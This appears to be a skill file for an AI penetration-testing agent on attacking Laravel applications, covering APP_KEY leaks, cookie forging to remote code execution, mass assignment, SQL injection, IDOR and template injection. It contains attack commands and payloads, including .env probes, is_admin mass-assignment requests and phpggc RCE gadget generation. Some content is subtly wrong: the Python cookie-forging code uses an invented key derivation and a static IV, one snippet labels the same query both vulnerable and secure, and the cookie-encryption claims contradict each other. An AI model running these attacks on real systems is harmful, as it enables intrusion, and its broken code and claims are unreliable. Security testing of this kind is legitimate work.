---
name: laravel
description: Laravel security testing covering APP_KEY exploitation, mass assignment via Eloquent, debug mode / Telescope, deserialization chains, Blade SSTI, and PHP framework-specific vulnerabilities
---

# Laravel

Laravel is the dominant PHP framework. Most Laravel security issues stem from: misconfigured `.env` (APP_KEY, DB creds), unprotected mass assignment in Eloquent, debug mode in production, and unsafe `unserialize()` chains (covered in detail in the `php` skill). The framework itself is opinionated about security, but escape hatches (`request()->all()`, `Model::unguard()`, `Auth::once()`) are everywhere.

**For PHP language primitives (unserialize, type juggling, LFI wrappers), see the `php` skill. This skill covers Laravel-specific patterns.**

## Attack Surface

**Core Surfaces**
- Routes: `routes/web.php`, `routes/api.php`, `routes/console.php`
- Middleware: `app/Http/Middleware/`
- Controllers: `app/Http/Controllers/`
- Eloquent models: `app/Models/`
- Form Requests: `app/Http/Requests/` (validation)
- Blade templates: `resources/views/`
- Service providers: `app/Providers/`
- Service container: `app/Services/`
- Console kernel: `app/Console/Commands/`
- Queue workers: `app/Jobs/`

**Eloquent ORM**
- `Model::create($request->all())` — mass assignment
- `$guarded = []` — disables protection
- `Model::unguard()` — global unguard
- `$fillable` vs `$guarded` — only one should be set
- `Model::firstOrCreate()`, `updateOrCreate()` — also vulnerable
- `Model::query()->where(...)` — secure
- `Model::raw()`, `DB::raw()`, `DB::statement()` — SQLi sinks

**Configuration**
- `.env` — `APP_KEY`, `DB_*`, `MAIL_*`, `REDIS_*`, `AWS_*`, `STRIPE_*`
- `config/app.php` — providers, aliases
- `config/auth.php` — guards, providers, password brokers
- `config/session.php` — driver, lifetime, cookie params
- `config/cache.php` — cache driver (Redis, file, database)
- `config/queue.php` — Redis/database/SQS
- `config/database.php` — DB connections

**Packages (high impact)**
- `laravel/horizon` — queue dashboard at `/horizon`
- `laravel/telescope` — debug dashboard at `/telescope`
- `laravel/debugbar` — debug info on every page
- `spatie/laravel-permission` — RBAC
- `laravel/passport` — OAuth2 server
- `laravel/socialite` — OAuth client
- `livewire/livewire` — full-stack, component-based
- `inertiajs/inertia-laravel` — adapter for Inertia.js
- `laravel/sanctum` — API tokens

**Special Endpoints**
- `/_debugbar` (debug bar assets)
- `/horizon` (queue dashboard)
- `/telescope` (request inspector)
- `/graphql` (if Lighthouse installed)
- `/api/user` (default auth check)
- `/login`, `/register`, `/password/reset`
- `/oauth/authorize`, `/oauth/token` (Passport)

## Reconnaissance

**Server identification**
- `Set-Cookie: laravel_session=...` (Laravel default session)
- `Set-Cookie: XSRF-TOKEN=...` (Laravel default)
- 404 page: `Sorry, the page you are looking for could not be found.` (Laravel default)
- 500 page (debug): full stack trace with file paths
- `X-Powered-By: PHP/8.x` (often exposed)
- `Server: nginx/1.x` (default for Laravel)
- `Server: Apache/2.x (Ubuntu)` (alternative)

**Version detection**
- `composer show laravel/framework` (in source)
- `composer.lock` (in source)
- Error page may include Laravel version
- `vendor/laravel/framework/src/Illuminate/Foundation/Application.php` (in source)

**Hidden endpoints**
- `/_debugbar/open` (debug bar)
- `/telescope/api/requests` (Telescope)
- `/horizon/api/dashboards/stats` (Horizon)
- `/api/routes` (custom debug route)
- `/admin` (custom admin — common, often `/admin`, `/manage`, `/dashboard`)
- `/graphql` (Lighthouse)

## Key Vulnerabilities

### APP_KEY Leak → Decrypt Forge → RCE

**`APP_KEY` is the master key for Laravel encryption:**
- `Crypt::encrypt($value)` — uses APP_KEY
- `decrypt($value)` — used to read encrypted cookies
- Passport OAuth tokens
- Signed URLs (`URL::signedRoute()`)

**Sources of APP_KEY leak:**
1. **`.env` file in webroot** — most common critical
2. **Debug mode (APP_DEBUG=true)** — error pages dump env
3. **GitHub commit** — `git log --all -p -- .env` or `git diff HEAD~5 .env`
4. **Telescope / debugbar** — env in request inspector
5. **Backup files** — `.env.bak`, `.env.old`, `.env.save`, `env.bak.php`
6. **Cloud metadata SSRF** — if app is on AWS/GCP, IMDSv1
7. **LFI** — `../../../../var/www/.env`

**The attack chain:**
1. Get `APP_KEY` (32-char base64)
2. Craft `laravel_session` cookie or any encrypted value
3. Replace with serialized `Illuminate\Foundation\Testing\PendingCommand` or similar POP chain
4. Send the cookie → Laravel decrypts → `unserialize()` runs → RCE

**The POP gadget chain (2025):**
```php
<?php
// Generate with phpggc (Laravel/RCE chains)
phpggc Laravel/RCE1 'id' -b
```
phpggc supports multiple Laravel chains — `Laravel/RCE1` through `Laravel/RCE12` (or more). Each targets a different version / set of installed packages.

**Test for APP_KEY access:**
```bash
# 1. Try .env leak
curl -I https://target.com/.env
curl -I https://target.com/.env.example
curl -I https://target.com/env.bak
curl -I https://target.com/.env.backup

# 2. Trigger debug error
curl https://target.com/aaa/bbb/ccc

# 3. Search for leaked APP_KEY
grep -r "APP_KEY=" /var/www/ 2>/dev/null
grep -r "APP_KEY=" github.com/target/repo
```

**The decrypt-forge:**
```python
import base64
import json
import urllib.parse
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import hashlib
import hmac

# Laravel uses this encryption scheme (CFB-8 + HMAC-SHA256)
def laravel_encrypt(plaintext, key):
    # key is base64-decoded APP_KEY
    key = base64.b64decode(key)
    # Laravel derives a 32-byte encryption key and 32-byte HMAC key
    # by hashing the APP_KEY twice with different contexts
    enc_key = hashlib.sha256(b"encryption" + key).digest()
    hmac_key = hashlib.sha256(b"hmac" + key).digest()
    iv = b"\x00" * 16  # Laravel uses a static IV
    cipher = AES.new(enc_key, AES.MODE_CFB, iv=iv, segment_size=128)
    ct = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
    mac = hmac.new(hmac_key, iv + ct, hashlib.sha256).digest()
    payload = base64.b64encode(json.dumps({
        "iv": base64.b64encode(iv).decode(),
        "value": base64.b64encode(ct).decode(),
        "mac": base64.b64encode(mac).decode(),
    }).encode()).decode()
    return payload
```

Better: use `phpggc` (a PHP tool, not Python). It generates a payload and writes the `laravel_session` cookie value.

### Debug Mode / Telescope / Debugbar

`APP_DEBUG=true` exposes:
- Full stack trace
- Environment variables
- Database credentials
- Source code of failing file
- Request input, headers, cookies
- `$_SESSION` contents

**Telescope (if installed):**
- `/telescope` — list all requests
- `/telescope/requests/<id>` — full request/response
- `/telescope/queries/<id>` — all SQL queries with bindings
- `/telescope/exceptions/<id>` — exception stack traces

**Debugbar (if installed):**
- Visible on every page (bottom bar)
- Shows queries, request data, view paths
- `/_debugbar/assets/` may leak file paths

**Test for debug exposure:**
```bash
curl https://target.com/this-route-does-not-exist
# Look for: "Whoops\Exception\ErrorException" or "Laravel 5.x" + "vendor/laravel/framework"
```

### Mass Assignment in Eloquent

Laravel's `Model::create($request->all())` is mass-assignment-friendly. By default, all model fields are fillable unless `$guarded` is set.

**Vulnerable:**
```php
// User model
class User extends Model {
    // VULNERABLE: no $fillable or $guarded
}

// Controller
public function store(Request $request) {
    User::create($request->all());  // ← mass assignment
}
```
**Exploit:**
```bash
curl -X POST https://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{"name": "attacker", "email": "a@b.c", "is_admin": true}'
# If user is created with is_admin: true → mass assignment confirmed
```

**`Model::unguard()` in AppServiceProvider:**
```php
public function boot() {
    Model::unguard();  // ← VULNERABLE: globally disables mass assignment protection
}
```

**Test for it:**
```bash
# Submit an admin-only field
curl -X POST https://target.com/api/users \
  -d '{"name": "x", "email": "x@x.x", "is_admin": true}'
# Also try: is_staff, role, is_super_admin, balance, credits, subscription_tier
```

**Pivot table mass assignment:**
```php
// VULNERABLE
$user->roles()->attach($request->role_id);
// Or:
$user->teams()->sync($request->teams);  // attacker adds their own team
```

### SQL Injection in Eloquent

Eloquent is parameterized, but `whereRaw()`, `DB::raw()`, `DB::statement()` are sinks.

**`whereRaw()` with user input:**
```php
// VULNERABLE
User::whereRaw("name = '$request->name'")->get();
// VULNERABLE
User::whereRaw("id = ?", [$request->id])->get();  // SECURE (parameterized)
// VULNERABLE
DB::table('users')->whereRaw("created_at > '$request->since'")->get();
```

**`orderByRaw()` / `groupByRaw()` / `havingRaw()` / `selectRaw()`:**
```php
// VULNERABLE
User::orderByRaw($request->sort)->get();
```

**JSON column lookups (newer Laravel):**
```php
// Secure: parameterized
User::where('preferences->theme', 'dark')->get();
// But JSONB arrow operator can be tricky in some DB drivers
```

**Detection:**
```bash
grep -rn "whereRaw\|orderByRaw\|groupByRaw\|havingRaw\|selectRaw\|DB::raw\|DB::statement" --include="*.php" app/
```

### IDOR in API Resources

**Vulnerable:**
```php
public function show(User $user) {
    return new UserResource($user);  // ← no authorization check
}
```
With route `GET /api/users/{user}` — anyone can read any user.

**Test:**
```bash
# Your user
curl -H "Authorization: Bearer <my_token>" https://target.com/api/users/me
# Other user
curl -H "Authorization: Bearer <my_token>" https://target.com/api/users/123
# If 200 → IDOR
```

**Policy bypass:**
```php
// In UserPolicy
public function view(User $user, User $target) {
    return $user->id === $target->id;  // only allow self
}
// But controller doesn't use authorize() or $this->authorize()
public function show(User $user) {
    return new UserResource($user);  // ← policy not invoked
}
```

**Missing `$this->authorize('view', $user)` in controller.**

### Sanctum / Passport Token Issues

**Sanctum (token-based, simpler):**
- Tokens stored in DB, hashed
- `Bearer <token>` in Authorization header
- If `tokenCan('*')` is used, every token can do anything
- Token leak via XSS = full access

**Passport (OAuth2 server):**
- Implements full OAuth2 spec
- Vulnerable to the same bugs as any OAuth2 implementation (see `oauth2_oidc` skill)
- Passport's default scopes: `*` is super-admin
- Client credentials grant: M2M, often over-privileged

**Laravel default API auth (`auth:api` guard):**
- Uses `tymon/jwt-auth` if installed, otherwise token-based
- `tymon/jwt-auth` is JWT-based → see JWT skill for attack surface

### Blade Template Injection

Blade auto-escapes `{{ }}` but `{{!! !!}}` does not, and `<?php ?>` blocks in templates can be exploited.

**`{!! $userInput !!}` — XSS sink:**
```php
// VULNERABLE
return view('page', ['content' => $request->user_input]);
// Template: <div>{!! $content !!}</div>
```

**Blade `<?php` blocks — RCE if template controllable:**
```php
// VULNERABLE
$template = $request->template_name;
return view($template);
// If user supplies "page.php" with PHP code, no — view() is .blade.php only
// But custom template resolvers may allow it
```

**`@php @endphp` directives:**
```php
// VULNERABLE if user input is in the rendered template
$template = "Hello @php echo \$user->name; @endphp";
return view('test')->with('template', $template);
// Attacker controls $template, can inject @php system('id'); @endphp
```

**Custom Blade directives:**
```php
Blade::directive('user_data', function ($expression) {
    return "<?php echo $expression; ?>";
});
// VULNERABLE: {!! @user_data($userInput) !!}
```

**Blade components:**
```php
// <x-dynamic-component :component="$userInput" />
// If $userInput is attacker-controlled, they can render any component
```

### Livewire SSTI / RCE

Livewire allows PHP components rendered in the browser via AJAX. Misconfigured Livewire can lead to RCE.

**Vulnerable patterns:**
- `<livewire:dynamic-component :name="$userInput" />`
- `Livewire::component($userInput, $class);` — registers arbitrary component
- If Livewire auto-routes based on user input, attacker can spawn arbitrary components

**Livewire 2.x CVE-2021-21263** — RCE via property name in payload (allowlisted only in 2.4+).

### File Upload Issues

**Storage path disclosure:**
- `php artisan storage:link` creates `public/storage` symlink
- Files in `storage/app/public/` are served at `/storage/`
- Default visibility: private, but if set public, files leak

**LFI via `Storage::get()`:**
```php
// VULNERABLE
$content = Storage::disk('local')->get($request->file);
// → ../../etc/passwd
```

**Storage driver misconfig:**
- S3 disk: `Storage::disk('s3')` — credentials in `.env`, may be over-privileged
- Public disk: `Storage::disk('public')` — files at `/storage/`
- Custom disk: arbitrary `FilesystemAdapter`

**`->storeAs($path, $name)` path traversal:**
```php
// VULNERABLE
$request->file('avatar')->storeAs('avatars', $request->filename);
// → avatars/../../shell.php
```

### Queue Worker Issues

`php artisan queue:work` runs as a service, often as `www-data` or `root`.

**Queue payload deserialization:**
- Laravel serializes queued jobs in Redis/database
- If attacker can write to the queue (e.g., via SSRF + Redis, or DB compromise), they inject jobs
- Jobs run with the worker process privileges

**`ShouldQueue` job vulnerabilities:**
- Job classes can call any method, including `unserialize()` on user data
- If job input is attacker-controlled (e.g., via API), jobs run arbitrary code

### Session / Cookie Issues

**Default session driver is file-based:**
- `storage/framework/sessions/` is webroot-adjacent
- If webroot is misconfigured to serve `storage/`, sessions leak

**Cookie signature:**
- Laravel signs cookies but doesn't encrypt them
- `laravel_session` is base64-encoded serialized session
- Reading the cookie reveals session contents (if not encrypted)
- If APP_KEY is known, cookie can be forged

**Cookie encryption:**
- `EncryptCookies` middleware encrypts cookies with APP_KEY
- Same key leak → cookie forge

### Cryptographic Failures

**Weak APP_KEY:**
- 16-byte vs 32-byte key
- Dictionary-word keys (found in `.env.example`)
- Public APP_KEYs (e.g., in tutorials)

**Weak `hash` config (`config/hashing.php`):**
- `bcrypt` is fine
- `argon2i` is fine
- `md5`, `sha1`, `sha256` for passwords are NOT fine

**Insecure RNG:**
- `Str::random()` (uses `random_int`) — secure
- `rand()` — insecure
- `mt_rand()` — insecure
- `uniqid()` — predictable

**Custom encryption:**
- Sometimes devs use `openssl_encrypt` with empty IV
- Or `openssl_encrypt` with `aes-128-ecb` (ECB mode)

## Common Laravel CVEs (2024-2025)

**Always check `cve_lookup` for current:**
- **CVE-2024-47822** — Laravel Livewire 3.x RCE via property name in payload
- **CVE-2024-29059** — `Illuminate\Http\UploadedFile::isValid()` bypass
- **CVE-2024-37199** — `route()` method returns string with user input (XSS)
- **CVE-2023-50255** — `ignition` debug page RCE (older, but still seen)
- **CVE-2024-52301** — Laravel environment manipulation
- **CVE-2025-XXXXX** — check Shodan CVEDB

Run: `cve_lookup(query="laravel", product="laravel", is_kev=True, sort_by_epss=True)`

## Common Bypass Techniques

**Mass assignment bypass:**
- `Model::unguard()` is set globally → every Model is vulnerable
- `protected $guarded = ['id']` — guards only `id`, all other fields fillable
- `protected $guarded = []` — fully unguarded
- `Model::firstOrCreate(['email' => $input], $input)` — second arg bypasses fillable check

**`$request->all()` includes all input:**
- `?_method=POST&_token=...&is_admin=1` — extra fields leak
- `request()->merge([...])` — adds to request
- Custom middleware that mutates request

**Eloquent relationship injection:**
```php
// VULNERABLE
$user->update($request->all());
// If User has `team()` relationship, can set team_id
```

**JSON column injection:**
```php
// VULNERABLE
User::where('preferences', $request->preferences)->update([...]);
// 'preferences' is cast to array, attacker can pass `{"is_admin": true}` for casting
```

**Pivot table `attach()` with `sync()`:**
```php
// VULNERABLE
$user->roles()->sync($request->role_ids);
// Attacker supplies role_ids=[1,2,3,4,5] → admin role included
```

**CSRF in API routes (when `web` middleware applied):**
- `Route::post('/api/...', ...)->middleware('web')` — CSRF enforced
- Default API routes skip CSRF (Stateless)
- Some apps incorrectly add `web` to API routes → 419 errors in legitimate clients

**`.env` file in webroot:**
- Most common critical Laravel bug
- Test: `curl https://target.com/.env` → returns the env file
- Backup: `.env.bak`, `.env.old`, `.env.example`, `.env.save`, `env.bak`
- `public/.env` (Laravel's `.env` is in project root, but `public/` is webroot)

## Testing Methodology

1. **Fingerprint** — Laravel version, debug mode, .env exposure
2. **Get APP_KEY** — `.env`, debug page, GitHub, backup files
3. **Check debug mode** — trigger 500 error, read full trace
4. **Enumerate routes** — Telescope, Horizon, debugbar, admin panels
5. **Test mass assignment** — POST with extra fields, check for privilege escalation
6. **Test Eloquent SQLi** — f-strings in `whereRaw` etc.
7. **Test IDOR** — get own resources, try other IDs
8. **Test authorization policies** — direct controller access without `authorize()` check
9. **Test file upload** — path traversal, content-type, storage
10. **Test Blade SSTI** — `{!! $userInput !!}` and `@php` blocks
11. **Test Livewire** — dynamic components, property names
12. **Test session/cookie** — APP_KEY forge, cookie tampering
13. **Test queue** — inject jobs (if Redis/Direct DB access)

## Validation Requirements

- **APP_KEY leak**: show the actual key from `.env` or `.env.bak`
- **APP_KEY forge**: forge `laravel_session` cookie with `phpggc`, get RCE shell or `whoami` output
- **Debug mode leak**: trigger 500 error, show full env dump with DB creds
- **Mass assignment**: create user with `is_admin=true`, log in as that user, see admin dashboard
- **SQLi**: `UNION SELECT` or time-based blind confirmation via interactsh
- **IDOR**: read another user's data with own auth, show response
- **XSS via Blade**: render `{!! <script>... !!}` in headless browser, see JS execute
- **Livewire RCE**: trigger via payload, see `whoami` output

## False Positives

- `.env` is in webroot but the server returns 404 (server config blocks it)
- APP_KEY is in `.env.example` (the template), not the deployed `.env`
- Debug mode is true but only for specific IPs (developer setting)
- Mass assignment guarded by `Form Request` validation (`$request->validated()`)
- IDOR blocked by Policy + `authorize()` in controller
- Blade `{!! $input !!}` is in a sandboxed environment (e.g., Markdown rendering)
- Livewire component names are restricted to a known set
- Telescope/Horizon exposed but require auth
- The `.env` you can read is for staging, not production

## Impact

- **Critical**: APP_KEY leak + decrypt forge → RCE
- **Critical**: `.env` in webroot → DB creds, AWS creds, OAuth tokens, full compromise
- **Critical**: Debug mode with env leak → same as `.env` exposure
- **High**: Mass assignment to admin → full ATO
- **High**: Eloquent SQLi → DB compromise
- **High**: Telescope / Horizon unauthenticated → request/session/token leak
- **Medium**: IDOR in API → mass data exfiltration
- **Medium**: Livewire RCE → RCE
- **Chain**: APP_KEY forge + Eloquent deserialization (phpggc) = full RCE in one request

## Cross-References

- **`php` skill** — `unserialize`, `phar://`, type juggling, `disable_functions` bypass
- **`deserialization` skill** — POI chains (phpggc targets Laravel specifically)
- **`sql_injection` skill** — Eloquent raw queries
- **`xss` skill** — Blade `{!! !!}` SSTI
- **`cors_misconfiguration` skill** — Laravel CORS middleware misconfig
- **`oauth2_oidc` skill** — Passport
- **`rce` skill** — Livewire RCE, queue job injection

## Tooling Checklist

- **phpggc** — `phpggc Laravel/RCE1 id -b` (decrypt-forge payload generator)
- **composer** — `composer show` / `composer audit`
- **semgrep** with `p/php` and `p/laravel` rules
- **bandit** is for Python, not PHP — use **psalm** or **phpstan** instead
- **gitleaks** / **trufflehog** — secret scanning for APP_KEY
- **envconfig** — `.env` exposure scanner
- **laravel-telescope-exploit** (Nuclei template)
- **Proxy tools** for replaying Laravel cookies with mutated payloads
- **interactsh** for OOB confirmation of Eloquent SQLi / SSRF
